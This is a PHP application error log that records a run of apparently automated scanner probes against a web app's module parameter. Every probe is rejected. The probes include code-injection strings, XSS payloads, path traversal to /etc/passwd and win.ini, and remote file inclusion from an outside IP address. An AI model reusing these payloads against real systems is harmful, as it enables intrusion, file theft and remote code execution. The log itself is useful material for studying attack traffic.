<?php
 die();
?>

10:16:46 Undefined offset: 1 in module/user/control.php on line 712 when visiting /www/index.php?m=user&f=login&referer=L3d3dy9pbmRleC5waHA=

12:33:46 ERROR: the control file module/${@print(md5(this_is_a_test_string))}/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

12:34:34 ERROR: the control file module/${@print(md5(this_is_a_test_string))}\/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

12:35:22 ERROR: the control file module/print(md5(this_is_a_test_string));die();/*/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

12:41:50 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http://120.26.55.211/s.txt&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

12:43:35 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http%3A%2F%2F120.26.55.211%2Fs.txt&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

12:47:00 ERROR: the control file module/a_long_name_file_not_exist/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=a_long_name_file_not_exist&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

12:48:07 ERROR: the control file module/company'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=company'%22%3E%3Ciframe%20onload=alert()%3E&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

12:52:25 ERROR: the control file module/company'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=company'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

12:55:44 ERROR: the control file module/company'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=company'%22%3E%3Csvg%20onload=prompt()%3E&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:00:22 ERROR: the control file module/phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:01:15 ERROR: the control file module/amf2yxnjcmlwddpwcm9tchqomtexktt4/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:04:27 ERROR: the control file module/companyi2027381i/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=companyi2027381i&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:04:30 ERROR: the control file module//etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%2Fetc%2Fpasswd&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:07:09 ERROR: the control file module/c://windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=c%3A%2F%2Fwindows%2Fwin.ini&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:10:36 ERROR: the control file module/../../../../../../../../etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:12:32 ERROR: the control file module/../../../../../../../../windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:14:08 ERROR: the control file module/../../../../../../../../../../etc/passwd%00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:16:51 ERROR: the control file module/../../../../../../../../../../windows/win.ini00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini00&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:18:58 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:18:58 ERROR: the control file module/../../../../../../../../etc/passwd in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:19:57 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:19:57 ERROR: the control file module/../../../../../../../../windows/win.ini in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:22:05 ERROR: the control file module/../../../../../../../../etc/passwd
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:31:11 ERROR: the control file module/../../../../../../../../windows/win.ini
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%0a.jpg&f=browse&param=0&type=bydept&orderBy=id&recTotal=23&recPerPage=20&pageID=2

13:35:43 ERROR: the control file module/${@print(md5(this_is_a_test_string))}/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:36:25 ERROR: the control file module/${@print(md5(this_is_a_test_string))}\/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:37:00 ERROR: the control file module/print(md5(this_is_a_test_string));die();/*/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:37:39 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http://120.26.55.211/s.txt&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:38:33 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http%3A%2F%2F120.26.55.211%2Fs.txt&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:41:46 ERROR: the control file module/a_long_name_file_not_exist/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=a_long_name_file_not_exist&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:45:07 ERROR: the control file module/product'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=product'%22%3E%3Ciframe%20onload=alert()%3E&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:45:56 ERROR: the control file module/product'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=product'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:46:21 ERROR: the control file module/${@print(md5(this_is_a_test_string))}/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

13:46:55 ERROR: the control file module/product'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=product'%22%3E%3Csvg%20onload=prompt()%3E&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:47:33 ERROR: the control file module/${@print(md5(this_is_a_test_string))}\/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

13:49:02 ERROR: the control file module/print(md5(this_is_a_test_string));die();/*/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

13:51:06 ERROR: the control file module//etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%2Fetc%2Fpasswd&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:51:56 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http://120.26.55.211/s.txt&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

13:55:36 ERROR: the control file module/c://windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=c%3A%2F%2Fwindows%2Fwin.ini&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

13:56:58 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http%3A%2F%2F120.26.55.211%2Fs.txt&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:00:24 ERROR: the control file module/a_long_name_file_not_exist/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=a_long_name_file_not_exist&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:00:25 ERROR: the control file module/../../../../../../../../etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

14:06:19 ERROR: the control file module/../../../../../../../../windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

14:06:19 ERROR: the control file module/story'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=story'%22%3E%3Ciframe%20onload=alert()%3E&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:07:02 ERROR: the control file module/story'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=story'%22%3E%3Cimg%20src=x%20onerror=prompt()%3E&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:07:02 ERROR: the control file module/../../../../../../../../../../etc/passwd%00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

14:07:41 ERROR: the control file module/../../../../../../../../../../windows/win.ini00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini00&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

14:07:54 ERROR: the control file module/story'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=story'%22%3E%3Csvg%20onload=prompt()%3E&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:08:20 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

14:08:20 ERROR: the control file module/../../../../../../../../etc/passwd in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

14:08:57 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

14:08:57 ERROR: the control file module/../../../../../../../../windows/win.ini in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

14:09:31 ERROR: the control file module//etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%2Fetc%2Fpasswd&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:09:32 ERROR: the control file module/../../../../../../../../etc/passwd
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

14:10:05 ERROR: the control file module/c://windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=c%3A%2F%2Fwindows%2Fwin.ini&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:10:08 ERROR: the control file module/../../../../../../../../windows/win.ini
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%0a.jpg&f=ajaxGetProjects&t=html&productID=4&projectID=0&branch=0

14:15:50 ERROR: the control file module/../../../../../../../../etc/passwd/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:18:46 ERROR: the control file module/../../../../../../../../windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:20:02 ERROR: the control file module/../../../../../../../../../../etc/passwd%00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:21:08 ERROR: the control file module/../../../../../../../../../../windows/win.ini00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini00&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:26:17 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:26:17 ERROR: the control file module/../../../../../../../../etc/passwd in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:28:25 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:28:25 ERROR: the control file module/../../../../../../../../windows/win.ini in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:29:02 ERROR: the control file module/../../../../../../../../etc/passwd
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0

14:29:50 ERROR: the control file module/../../../../../../../../windows/win.ini
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%0a.jpg&f=ajaxGetProductStories&t=html&productID=4&branch=0&moduleId=0&storyID=0
